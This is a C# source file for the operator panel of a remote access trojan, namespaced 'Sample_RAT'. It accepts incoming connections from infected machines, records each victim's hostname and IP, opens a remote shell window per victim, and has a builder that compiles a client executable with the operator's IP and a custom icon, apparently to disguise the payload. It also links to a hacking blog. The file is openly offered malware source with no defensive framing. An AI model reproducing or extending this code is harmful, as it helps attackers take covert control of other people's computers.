using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

namespace Sample_RAT
{
    public partial class winMain : Form
    {
        string iconnPath;
        int indexRow;
        libServer server = new libServer();
        List<TcpClient> ClientList;
        List<winShell> Shells;
        public winMain()
        {
            InitializeComponent();
            ClientList = new List<TcpClient>();
            Shells = new List<winShell>();
            server.OnStartServer();
            server.OnClientConEventArgs += HandlClientCon;
            server.OnTextRecivedEventArgs += HandlClientTextRecive;
            server.OnRemoveClientEventArgs += HandlRemoveClient;
        }

        string varIP;
        private string myIP()
        {
            IPAddress[] iPAddress = Dns.GetHostAddresses(Dns.GetHostName());
            foreach (IPAddress iP in iPAddress)
            {
                if (iP.AddressFamily == AddressFamily.InterNetwork)
                {
                    varIP = iP.ToString();
                    break;
                }
            }
            return varIP;
        }

        winShell shellbox(int i, winMain winMain, TcpClient tcpClient)
        {
            winShell l = new winShell(winMain, tcpClient);
            return l;
        }

        int id;
        private void HandlClientCon(object sender, ClientsConEventArgs e)
        {
            id++;
            string ip = ((IPEndPoint)(e.NewClient.Client.RemoteEndPoint)).Address.ToString();
            IPHostEntry hostname = Dns.GetHostEntry(ip);
            dGV.Rows.Add(id, hostname.HostName, ip, DateTime.Now.ToLongTimeString());
            winShell l = shellbox(id, this, e.NewClient);
            l.IP = ip;
            l.isRun = true;
            l.Show();
            Shells.Add(l);
        }

        private void HandlClientTextRecive(object sender, TextRecivedEventArgs e)
        {
            string ip = ((IPEndPoint)(e.WhoSend.Client.RemoteEndPoint)).Address.ToString();
            foreach (winShell item in Shells)
            {
                if (ip == item.IP)
                {
                    item.RecivedText = e.TextReceived;
                }
            }
        }
        private void HandlRemoveClient(object sender, ClientRemoveEventArgs e)
        {
            string ip = ((IPEndPoint)(e.RemoveClient.Client.RemoteEndPoint)).Address.ToString();
            foreach (DataGridViewRow row in dGV.Rows)
            {
                if (ip == row.Cells["IPGV"].Value.ToString())
                {
                    dGV.Rows.Remove(row);
                }
            }

            foreach (winShell item in Shells)
            {
                if (ip == item.IP)
                {
                    item.isRun = false;
                    item.Close();
                }
            }
        }
        private void winMain_Load(object sender, EventArgs e)
        {
            lblIp.Text = "IP Address : " + myIP();
            txtIPAddress.Text = myIP();
        }

        private void dGV_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.ColumnIndex != -1 && e.RowIndex != -1)
            {
                DataGridViewRow row = dGV.Rows[e.RowIndex];
                foreach (winShell item in Shells)
                {
                    if (row.Cells["IPGV"].Value.ToString() == item.IP)
                    {
                        item.Show();
                    }
                }
            }
        }

        private void btnIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog Odb = new OpenFileDialog();
            Odb.Filter = "(*.ico) | *.ico";
            if (Odb.ShowDialog() == DialogResult.OK)
            {
                iconnPath = Odb.FileName;
                pbIcon.Image = Image.FromFile(Odb.FileName);
            }
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "(*.exe) | *.exe";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtFileSave.Text = saveFileDialog.FileName;
            }
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (txtFileSave.Text == string.Empty || txtIPAddress.Text == string.Empty || iconnPath == string.Empty)
            {
                MessageBox.Show("Some feild are missing ?", "info", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {
                libBuilder.Build(txtIPAddress.Text.Trim(), iconnPath, txtFileSave.Text.Trim());
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://secrethackersite.blogspot.com");
        }
    }
}
